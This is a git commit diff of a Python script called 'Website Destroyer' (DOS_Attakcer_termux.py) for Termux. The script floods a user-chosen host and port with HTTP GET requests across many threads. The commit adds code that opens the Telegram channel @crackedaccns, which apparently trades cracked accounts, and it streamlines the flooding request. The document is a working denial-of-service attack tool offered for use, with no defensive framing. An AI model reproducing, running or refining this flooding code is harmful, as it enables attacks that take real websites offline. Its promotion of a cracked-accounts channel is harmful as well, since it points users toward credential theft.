24beed3690bbfb61b05869028a052e96d5480e60
Celestial Being <117974651+celestialsbeings@users.noreply.github.com>
2023-12-05 17:55:08 +0530

    DOS_Attakcer_termux.py

--- DOS_Attakcer_termux.py
+++ DOS_Attakcer_termux.py
@@ -1,21 +1,26 @@
-#devloped by @celestialsbeings also join @crackedaccns
 import socket
 import threading
 import webbrowser
 import pyfiglet
+import subprocess
+import time
 
+def open_link(link):
+    subprocess.run(['termux-open-url', link])
+
+url_to_open = 'https://t.me/crackedaccns'
 banner = pyfiglet.figlet_format("Website Destroyer", font='slant')
 print(banner)
-Join = pyfiglet.figlet_format("First Join @crackedaccns", font='slant')
-
+join_banner = pyfiglet.figlet_format("First Join @crackedaccns", font='slant')
+print(join_banner)
 
 # Open a new browser window pointing to a specific URL
 try:
-    print(join)
-    webbrowser.open('http://www.google.com')
-except:
-    pass
-    
+    time.sleep(2)
+    open_link(url_to_open)
+except Exception as e:
+    print(f"An error occurred while opening the link: {e}")
+    webbrowser.open('https://t.me/crackedaccns')
 
 # Global counter for the number of requests
 num_requests = 0
@@ -29,8 +34,7 @@ def perform_dos(target, port, threads):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((target, port))
-                s.send(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'))
-                s.send(("Host: " + target + "\r\n\r\n").encode('ascii'))
+                s.send(("GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n").encode('ascii'))
                 s.close()
 
                 # Increment the counter and print the number of requests
@@ -61,3 +65,4 @@ if __name__ == "__main__":
     target_port = int(input("Enter the target port (default is 80): ") or 80)
     num_threads = int(input("Enter the number of threads (e.g., 10): "))
     perform_dos(target_host, target_port, num_threads)
+    
